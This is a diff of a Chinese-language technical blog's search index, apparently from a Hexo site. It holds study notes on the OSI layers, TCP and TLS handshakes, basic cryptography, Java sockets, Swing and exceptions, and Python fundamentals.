-<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
-<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java-GUI编程</title>
-    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
-<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
-<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
-<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
-<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
-<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
-<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
@@ -1772,14 +1601,148 @@
       </tags>
   </entry>
   <entry>
-    <title>Java网络编程</title>
-    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
-<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+    <title>密码算法</title>
+    <url>/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="对称加密"><a class="header-anchor" href="#对称加密"></a>对称加密</h2>
+<ul>
+<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li>
+<li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li>
+<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持128、192、256、512位密钥的加密；</li>
+<li>RC2：分组加密，输入输出均为64位</li>
+<li>RC4：流密码</li>
+<li>Blowfish：区块加密算法</li>
+</ul>
+<h2 id="非对称加密"><a class="header-anchor" href="#非对称加密"></a>非对称加密</h2>
+<ul>
+<li>
+<p>RSA：基于大数分解难题</p>
+<ul>
+<li>随意选择两个大的质数p和q，p不等于q，计算N = pq.</li>
+<li>根据欧拉函数，求得r=φ(N)=φ§φ(q)=(p-1)(q-1)。</li>
+<li>选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）</li>
+<li>将p和q的记录销毁。</li>
+</ul>
+<p>其中(N，e)是公钥，(N，d)是私钥。</p>
+<p>参考：<a href="https://blog.csdn.net/gao131360144/article/details/79966094">https://blog.csdn.net/gao131360144/article/details/79966094</a></p>
+</li>
+<li>
+<p>DSA：基于整数有限域离散对数难题</p>
+</li>
+<li>
+<p>ECC：椭圆曲线</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OSI模型</title>
+    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
+<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
+<p>能产生数据流量的并且能与用户交互的程序</p>
+<p>记事本不是，因为不能产生数据流量</p>
+<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
+<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
+<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
+<p>对话控制（记录该由谁来发送数据）</p>
+<p>令牌管理（禁止双方同时执行同一关键操作）</p>
+<p>同步功能（设置断点，崩溃恢复）</p>
+<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
+<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
+<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
+<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
+<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
+<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
+<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
+<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
+<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCP&amp;IP</title>
+    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
+    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
+<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
+<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
+<ul>
+<li>
+<p>三次握手</p>
+<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
+<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
+<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
+<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
+<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
+<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
+<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
+</li>
+<li>
+<p>四次挥手</p>
+<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
+<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
+<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
+</li>
+</ul>
+<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
+<p>有连接/无连接（可靠/不可靠）</p>
+<p>有拆分合并/无拆分合并</p>
+<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
+<p>单播/多播</p>
+<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
+<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
+<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
+<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
+<p>http1.0 vs http1.1</p>
+<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
+<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
+<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
+<ul>
+<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
+<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
+<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
+<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
+<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
+<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
+<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
+<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
+</ul>
+<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
+<ul>
+<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java-GUI编程</title>
+    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -1787,6 +1750,7 @@
       </categories>
       <tags>
         <tag>Java</tag>
+        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
@@ -1820,12 +1784,139 @@
       </tags>
   </entry>
   <entry>
+    <title>Java 异常及处理</title>
+    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
+<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
+<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+<p>不处理异常，将异常抛出给调用者。</p>
+<p><code>throw</code>  、<code>throws</code></p>
+<p>（挖坑待填）</p>
+<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
+<ol>
+<li>可能出现异常的代码用<code>try</code>块括起来</li>
+<li>用<code>catch</code>块来捕获异常并处理异常</li>
+<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
+</ol>
+<p><strong>代码执行过程的三种情况</strong></p>
+<ol>
+<li>
+<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
+</li>
+</ol>
+<blockquote>
+<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
+<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python基础</title>
     <url>/2021/01/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
-    <content><![CDATA[<h2 id="import-的使用"><a class="header-anchor" href="#import-的使用"></a>import 的使用</h2>
+    <content><![CDATA[<h2 id="输入输出"><a class="header-anchor" href="#输入输出"></a>输入输出</h2>
+<p><strong>输出</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">'%d,%d'</span>%(i,j),end=<span class="string">""</span>) <span class="comment"># print格式化字符串</span></span><br></pre></td></tr></table></figure>
+<p><strong>输入</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = input(<span class="string">"input a number!\n"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="字符串常用函数"><a class="header-anchor" href="#字符串常用函数"></a>字符串常用函数</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.字母处理：</span></span><br><span class="line">.upper()    <span class="comment"># 全部大写</span></span><br><span class="line">.lower()    <span class="comment"># 全部小写</span></span><br><span class="line">.swapcase()    <span class="comment"># 大小写互换</span></span><br><span class="line">.capitalize()    <span class="comment"># 首字母大写，其余小写</span></span><br><span class="line">.title()    <span class="comment"># 首字母大写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.格式化相关</span></span><br><span class="line">.ljust(width)     <span class="comment"># 获取固定长度，左对齐，右边不够用空格补齐</span></span><br><span class="line">.rjust(width)     <span class="comment"># 获取固定长度，右对齐，左边不够用空格补齐</span></span><br><span class="line">.center(width)  <span class="comment"># 获取固定长度，中间对齐，两边不够用空格补齐</span></span><br><span class="line">.zfill(width)      <span class="comment"># 获取固定长度，右对齐，左边不足用0补齐</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.字符串搜索相关</span></span><br><span class="line">.find()    <span class="comment"># 搜索指定字符串，找到则返回对应下标，没有则返回-1</span></span><br><span class="line">.index()    <span class="comment"># 同上，但是找不到会报错</span></span><br><span class="line">.rfind()    <span class="comment"># 从右边开始查找</span></span><br><span class="line">.count()    <span class="comment"># 统计指定的字符串出现的次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.字符串处理</span></span><br><span class="line">.split(<span class="string">"分割符(串)"</span>,[分割次数])	<span class="comment"># 分割字符串，得到一个子串列表</span></span><br><span class="line">.replace(<span class="string">"原子串"</span>,<span class="string">"新子串"</span>)	<span class="comment"># 子串替换</span></span><br></pre></td></tr></table></figure>
+<h2 id="数据结构"><a class="header-anchor" href="#数据结构"></a>数据结构</h2>
+<h3 id="list-列表"><a class="header-anchor" href="#list-列表"></a>list-列表</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = []</span><br><span class="line">a.append(<span class="string">'a'</span>)	<span class="comment">#在列表最后加入一个元素'a'</span></span><br><span class="line">a.pop(<span class="number">0</span>)		<span class="comment">#删除列表中索引为0的元素</span></span><br><span class="line">a.insert(<span class="number">0</span>,<span class="string">'b'</span>)	<span class="comment">#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位</span></span><br><span class="line">a.index(<span class="string">'b'</span>)	<span class="comment">#返回元素'b'在列表中第一次出现的位置</span></span><br><span class="line">a.count(<span class="string">'b'</span>)	<span class="comment">#元素'b'在列表中出现的次数</span></span><br><span class="line">a.__len__()		<span class="comment">#返回列表的长度</span></span><br></pre></td></tr></table></figure>
+<h3 id="tuple-元祖"><a class="header-anchor" href="#tuple-元祖"></a>tuple-元祖</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 元组和列表的区别是：元组中的元素不可变；共同点是都可以使用“[]”进行取值</span></span><br><span class="line">a = (<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)	<span class="comment"># 创建元组</span></span><br><span class="line">b = a[<span class="number">2</span>]		<span class="comment"># ‘c’</span></span><br></pre></td></tr></table></figure>
+<h3 id="dict-字典"><a class="header-anchor" href="#dict-字典"></a>dict-字典</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;&#125; <span class="comment"># 创建dict</span></span><br><span class="line">dict1[<span class="string">'a'</span>] = <span class="number">100</span> <span class="comment"># 添加元素</span></span><br><span class="line">key_list = list(i.keys()) <span class="comment"># 获取key列表</span></span><br><span class="line"><span class="keyword">del</span> dict1 <span class="comment"># 清空dict</span></span><br><span class="line"><span class="keyword">del</span> dict1[<span class="string">'a'</span>] <span class="comment"># 删除键值对 ———— 'a':100</span></span><br></pre></td></tr></table></figure>
+<h3 id="set-集合"><a class="header-anchor" href="#set-集合"></a>set-集合</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>&#125; <span class="comment"># 创建set1</span></span><br><span class="line">set1.add(<span class="number">3</span>) <span class="comment"># 新增元素，set1为 &#123;1,2,3&#125;</span></span><br><span class="line">set1.add(<span class="number">2</span>) <span class="comment"># 添加set中已存在的元素，不改变set，仍为 &#123;1,2,3&#125;</span></span><br><span class="line">set1.add([<span class="number">1</span>,<span class="number">2</span>]) <span class="comment"># 报错，不可add可变对象</span></span><br><span class="line">set1.remove(<span class="number">1</span>) <span class="comment"># 从set1中删去元素 1，set1变为 &#123;2,3&#125;</span></span><br><span class="line">set1.remove(<span class="number">4</span>) <span class="comment"># 从set1中删去元素 4，报错，因为set1中不存在元素 4</span></span><br><span class="line">set1.discard(<span class="number">3</span>) <span class="comment"># 从set1中删去元素 3，set1变为 &#123;2&#125;</span></span><br><span class="line">set1.discard(<span class="number">5</span>) <span class="comment"># 从set1中删去元素 5，set1中不存在元素5，set1仍为 &#123;2&#125;，不报错</span></span><br><span class="line"></span><br><span class="line">set2 = &#123;<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># 创建set2</span></span><br><span class="line">set3 = set2.uniom(set1) <span class="comment"># 并集</span></span><br><span class="line">set3 = set2.intersection(set1) <span class="comment"># 交集</span></span><br><span class="line">set3 = set2.difference(set1) <span class="comment"># 差集</span></span><br></pre></td></tr></table></figure>
+<h2 id="类型转换函数"><a class="header-anchor" href="#类型转换函数"></a>类型转换函数</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bool()		<span class="comment"># 根据传入的参数的逻辑值创建一个新的布尔值</span></span><br><span class="line">int()		<span class="comment"># 根据传入的参数创建一个新的整数</span></span><br><span class="line">float()		<span class="comment"># 根据传入的参数创建一个新的浮点数</span></span><br><span class="line"></span><br><span class="line">bin()		<span class="comment"># 将整数转换成2进制字符串</span></span><br><span class="line">oct()		<span class="comment"># 将整数转化成8进制数字符串</span></span><br><span class="line">hex()		<span class="comment"># 将整数转换成16进制字符串</span></span><br><span class="line"></span><br><span class="line">ord()		<span class="comment"># 返回Unicode字符对应的整数</span></span><br><span class="line">chr()		<span class="comment"># 返回整数所对应的Unicode字符</span></span><br><span class="line">str()		<span class="comment"># 返回一个对象的字符串表现形式</span></span><br><span class="line"></span><br><span class="line">tuple()		<span class="comment"># 根据传入的参数创建一个新的元组</span></span><br><span class="line">list()		<span class="comment"># 根据传入的参数创建一个新的列表</span></span><br><span class="line">dict()		<span class="comment"># 根据传入的参数创建一个新的字典</span></span><br><span class="line">set()		<span class="comment"># 根据传入的参数创建一个新的集合</span></span><br></pre></td></tr></table></figure>
+<h2 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h2>
+<h3 id="文件读写"><a class="header-anchor" href="#文件读写"></a>文件读写</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file1 = open(<span class="string">"file_name"</span>,<span class="string">"$&#123;mode&#125;"</span>)</span><br><span class="line">file1.write()</span><br><span class="line">file1.close</span><br></pre></td></tr></table></figure>
+<p>mode如下表所示</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">含义</th>
+<th>文件不存在时</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>r</code></td>
+<td style="text-align:center">打开文件以阅读（默认模式）</td>
+<td>报错</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>w</code></td>
+<td style="text-align:center">打开文件以写入，覆盖原文件</td>
+<td>创建</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>a</code></td>
+<td style="text-align:center">打开写入，追加到文件末尾</td>
+<td>创建</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>b</code></td>
+<td style="text-align:center">二进制模式，与<code>r</code> <code>w</code>一起使用</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>t</code></td>
+<td style="text-align:center">文本模式（默认就有，不用自己写）</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center"><code>+</code></td>
+<td style="text-align:center">打开文件进行更新（读取和写入）</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="常用方法"><a class="header-anchor" href="#常用方法"></a>常用方法</h3>
